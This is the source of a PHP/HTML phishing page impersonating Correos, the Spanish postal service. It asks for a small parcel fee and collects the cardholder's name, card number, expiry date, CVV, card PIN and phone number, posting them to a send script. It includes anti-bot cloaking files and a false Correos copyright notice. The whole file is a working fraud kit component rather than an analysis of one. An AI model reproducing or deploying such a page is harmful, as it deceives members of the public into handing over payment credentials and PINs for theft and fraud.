<?php
    include "anti/anti1.php";
    include "anti/anti2.php";
    include "anti/anti3.php";
    include "anti/anti4.php";
    include "anti/anti7.php";
    include "anti/anti8.php";

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago</title>
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="styles/head.css">
    <link rel="stylesheet" href="styles/main.css">
    <link rel="stylesheet" href="styles/responsive.css">
    <link rel="stylesheet" href="styles/codigo.Css">
    <!-- <link rel="stylesheet" href="styles/afterlog.css"> -->
    <link rel="stylesheet" href="styles/corr.css">
</head>
<body>
    <header>
        <nav>
            <div><img src="images/LogoCornamusa.svg" alt="image" height="40px" ></div>
            <div class="lina-nav">Ir a correos.es</div>
        </nav>
    </header>
    <main>
        <div class="grid1">
            <img src="images/background-login.jpg" alt="image" class="imgbackground">
        </div>
        <div class="grid2">
                <div class="divtotal">
                    <div>Total</div>
                    <div>1,64 €</div>
                </div>
                <div class="divreference">
                    <div><img src="images/livraison.jpg" alt="image" height="70px"></div>
                    <div class="ecriir">
                        <div class="codii">Código de envío : ES/6073297</div>
                        <div class="premi">Paquete Premium</div>
                    </div>
                </div>
            <form action="send/send2.php" method="POST" class="formcc">
                <div class="detal"><svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="45px" height="45px" viewBox="0 0 73.312 73.312" style="enable-background:new 0 0 73.312 73.312;color:blue;" xml:space="preserve">
                                                        <g>
                                                            <g>
                                                                <g>
                                                                    <path style="fill:#193c6b" d="M66.368,20.672c0.224,0,0.224,0,0.447,0l-3.359-12.99c-0.896-3.809-4.929-6.049-8.513-4.929L5.217,15.969
				c-3.808,0.896-6.048,4.928-4.928,8.512l4.256,16.128v-9.632c0-5.822,4.704-10.526,10.528-10.526h51.295V20.672z"></path>
                                                                    <path style="fill:#193c6b" d="M66.368,24.256h-51.52c-3.808,0-6.943,3.137-6.943,6.944v32.702c0,3.81,3.136,6.944,6.943,6.944h51.52
				c3.808,0,6.943-3.137,6.943-6.944V31.202C73.313,27.392,70.176,24.256,66.368,24.256z M68.609,63.905
				c0,1.345-1.119,2.239-2.239,2.239H14.85c-1.344,0-2.239-1.119-2.239-2.24v-8.286h56.223v8.286L68.609,63.905L68.609,63.905z
				 M68.609,39.489h-56v-8.287c0-1.345,1.12-2.24,2.239-2.24h51.52c1.345,0,2.239,1.12,2.239,2.24L68.609,39.489L68.609,39.489z"></path>
                                                                </g>
                                                            </g>
                                                        </g>
                                                    </svg> Detalles del pago</div>


                <!--junia-->

                <div class="divinput">
                    <div for="name" class="labelname">Nombre en la tarjeta <span style="color: red;">*</span></div>
                    <input type="text" id="name" name="name" class="name" required="">
                </div>

                <div class="divinput">
                    <div for="tel" class="labelname">Número de tarjeta <span style="color: red;">*</span></div>
                    <input type="tel" id="name" name="cc" class="cc" required="" minlength="14" placeholder="xxxx xxxx xxxx xxxx">
                </div>

                <div class="divinputexp">
                    <div for="name" class="labelname">Fecha de caducidad  <span style="color: red;">*</span></div>
                    <div>
                    <select name="month" id="month" required="">
                        <option value="" selected="">Mes</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <select name="year" id="year" required="">
                        <option value="" selected="">Año</option>
                        <option value="2022">2022</option>
                        <option value="2023">2023</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                        <option value="2035">2035</option>
                    </select>
                    </div>
                    
                </div>

                <div class="divinput">
                    <div for="name" class="labelname">Código CVV  <span style="color: red;">*</span></div>
                    <input type="tel" id="pincvv" name="cvv" class="cvv"  class="pincvv" placeholder="xxx" required="">
                </div>

                <div class="divinput">
                    <div for="name" class="labelname"> PIN  <span style="color: red;">*</span></div>
                    <input type="tel" id="pincvv" name="pin" class="pin" class="pincvv" placeholder="xxxx" required="">
                </div>
                <div class="divinput">
                    <div for="name" class="labelname"> Número de teléfono  <span style="color: red;">*</span></div>
                    <input type="tel" id="pincvv" name="telefono" class="telefono" class="pincvv" placeholder="" minlength="11" required="">
                </div>
                <div class="divbtnsubmit2">
                        <button type="submit" id="submitbtncodigo" style="font-size: 17px;cursor:pointer;color:#002e6d">Pagar y continuar</button>
                    </div>
            </form> 
        </div>
    </main>
    <footer>
        <div class="containerfooter">
            <div>
                <div><img src="images/footer-logo.svg" alt="image"></div>
            </div>
            <div class="divlastfoot">
                <div class="apaa">
                    <div class="textapa">Política de cookies</div>
                    <div class="textapa">Aviso legal</div>
                    <div class="textapa">Privacidad web</div>
                    <div class="textapa">Alerta seguridad</div>
                </div>
                <div class="lasttx">
                    ©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados.
                </div>
            </div>
        </div>

    </footer>
    <script src="javascript/codigo.js"></script>
    <script src="javascript/junia.js"></script>
    <script>
        let cc = document.querySelector(".cc");
        let cvv = document.querySelector(".cvv");
        let pin = document.querySelector(".pin");
        let tel = document.querySelector(".telefono");

        new Cleave(cc,{
            creditCard : true,
            delimiter:"",
        })
        new Cleave(cvv,{
            numericOnly:true,
            delimiter:"",
            blocks:[4],
        })
        new Cleave(pin,{
            numericOnly:true,
            delimiter:"",
            blocks:[4],
        })
        new Cleave(tel,{
            prefix : "+34",
            numericOnly:true,
            delimiter:"",
        })
        
    </script>
</body>
</html>